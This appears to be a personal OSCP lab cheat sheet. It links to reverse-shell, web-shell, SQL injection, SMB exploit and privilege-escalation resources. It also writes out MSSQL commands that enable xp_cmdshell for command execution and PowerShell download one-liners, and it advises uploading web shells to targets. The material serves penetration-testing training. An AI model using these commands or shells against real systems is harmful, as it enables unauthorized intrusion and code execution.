OSCP Arsenal
============
The following are guilds, tools, and tip that I found good to have in the back pocket during PWK labs.

I found this to be a pretty excellent cheat sheet in general: https://github.com/wwong99/pentest-notes/blob/master/oscp_resources/OSCP-Survival-Guide.md

Payloads for all the things: https://github.com/swisskyrepo/PayloadsAllTheThings

Initial Enumeration
-------------------
Amazing tool: https://github.com/Tib3rius/AutoRecon

Good for scanning UDP: https://tools.kali.org/information-gathering/unicornscan

Reverse Shells
--------------
Methods of establishing an initial rev shell: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

And many more: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

And to power them up to TTYs: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

Web Reverse Shells
------------------
Upload the payload to the target's web root, browse to it, pop!

### ASP
For Windows IIS servers your best bet is some kind of ASP shell. They can be generated by MSFVenom with the asp, aspx or aspx-exe formats. Not sure exactly when to use each one, just try all three!

### PHP
If the server is Apache, it's probably part of LAMP/XAMPP.

Windows: https://github.com/Dhayalanb/windows-php-reverse-shell

Linux: https://github.com/pentestmonkey/php-reverse-shell

### JSP
https://blog.netspi.com/hacking-with-jsp-shells/

SQL Injection
-------------
https://portswigger.net/web-security/sql-injection/cheat-sheet

SQL to Execution
----------------
MySQL UDF: https://www.exploit-db.com/exploits/1181

MSSQL:

    EXEC sp_configure 'show advanced options', 1
    RECONFIGURE WITH OVERRIDE
    GO
    EXEC sp_configure 'xp_cmdshell', 1
    RECONFIGURE WITH OVERRIDE
    GO
    EXEC xp_cmdshell 'command_goes_here'
    GO

Port Forwarding
---------------
Use pfwd (.py or .go) from this repo. Note, you can cross compile easily with go to make a Windows port forwarding executable!

Powershell One-Liners
---------------------
curl: (new-object system.net.webclient).DownloadString('file_url')

wget: (new-object system.net.webclient).DownloadFile('file_url','path_on_disk')

SMB Exploits
------------
MS08-067: https://github.com/andyacer/ms08_067

MS17-010: https://github.com/helviojunior/MS17-010

PE guides
---------
https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html
https://hackingandsecurity.blogspot.com/2017/09/oscp-linux-priviledge-escalation.html

PE workshop: https://github.com/sagishahar/lpeworkshop

